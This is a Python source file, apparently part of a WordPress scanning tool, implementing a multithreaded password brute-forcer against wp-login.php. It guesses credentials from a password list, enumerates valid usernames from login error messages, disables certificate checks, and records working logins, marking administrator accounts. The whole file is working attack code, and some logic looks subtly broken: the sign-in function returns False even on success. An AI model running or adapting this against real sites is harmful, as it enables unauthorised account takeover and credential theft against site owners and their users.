from urllib.parse import urlparse, urlunparse
from concurrent.futures import ThreadPoolExecutor

import requests
from bs4 import BeautifulSoup
import keyboard


class Bruteforce:
    def __init__(self, scanner) -> None:
        self.__url: str = scanner.url
        self.__user_agent: str = scanner.user_agent
        self.__usernames = scanner.usernames
        self.__passwords = self.set_passwords()
        self.__logins = scanner.logins
        self.__admin = scanner.admin
        self.__stop = False  # Add a stop flag
        keyboard.on_press_key("q", self.stop)  # Stop on 'q' key press

    def stop(self, e=None):  # Add a method to set the stop flag
        self.__stop = True

    def set_passwords(self, filepath="src/db/passwords.txt"):
        with open(filepath, "r") as file:
            passwords = file.read().split()
        return passwords

    @property
    def user_agent(self) -> str:
        return self.__user_agent

    @property
    def admin(self) -> dict:
        return self.__admin

    @property
    def passwords(self):
        return self.__passwords

    @property
    def users(self):
        return self.__usernames

    @property
    def logins(self):
        return self.__logins

    @property
    def url(self) -> str:
        parsed_url = urlparse(self.__url)
        if parsed_url.scheme == "http":
            parsed_url = parsed_url._replace(scheme="https")
        url = urlunparse(parsed_url)
        return url

    def __sign_in(self, session, username, password):
        slug: str = "wp-login.php"
        login_data = {
            "log": username,
            "pwd": password,
            "wp-submit": "Log In",
            "redirect_to": f"{self.url}wp-admin/",
            "testcookie": "1",
        }
        login_cookie = "wordpress_test_cookie=WP Cookie check"

        res = session.post(
            self.url + slug,
            headers={
                "Cookie": login_cookie,
                "User-Agent": self.user_agent,
            },
            verify=False,
            data=login_data,
        )
        res = BeautifulSoup(res.text, "html.parser")
        error = res.find("div", {"id": "login_error"})
        if error:
            error_msg = error.text.strip()
            if (
                error_msg
                == f"Error: The password you entered for the username {username} is incorrect. Lost your password?"
            ):
                self.__usernames.add(username)
            print(f"Login failed with message: {error_msg}")
            session.close()
            return False

        wpadminbar = res.find("body").find("div", {"id": "wpadminbar"})
        if wpadminbar:
            print(f"Successful login with {username}:{password} (admin)")
            self.__admin[username] = password
            session.close()
            return False
        else:
            print(f"Successful login with {username}:{password} (not admin)")
            self.__logins[username] = password
            session.close()
            return False

    def detect_admin(self):
        with requests.Session() as s:
            for user in self.users:
                if self.__sign_in(s, user, "12345"):
                    print(f"Admin user found: {user}")
                    return True

    def try_to_sign_in(self, username, password):
        with requests.Session() as s:
            self.__sign_in(s, username, password)

    # TODO: bruteforce only for admin search; at least one user must be found; detect users by erros without bf passwords

    def bruteforce(self, usernames=False, passwords=False, max_workers=10):
        if not usernames:
            usernames = self.users
        if not passwords:
            passwords = self.passwords
        self.__stop = False  # Reset the stop flag
        print("Press 'q' to stop the bruteforce.")
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            with requests.Session() as session:
                for username in usernames:
                    if self.__stop:  # Check the stop flag
                        print("Bruteforce stopped.")
                        break
                    if executor._shutdown:
                        break
                    tasks = []
                    for password in passwords:
                        if self.__stop:  # Check the stop flag
                            break
                        task = executor.submit(
                            self.__sign_in, session, username, password
                        )
                        if not any(task.result() for task in tasks):
                            tasks.append(task)
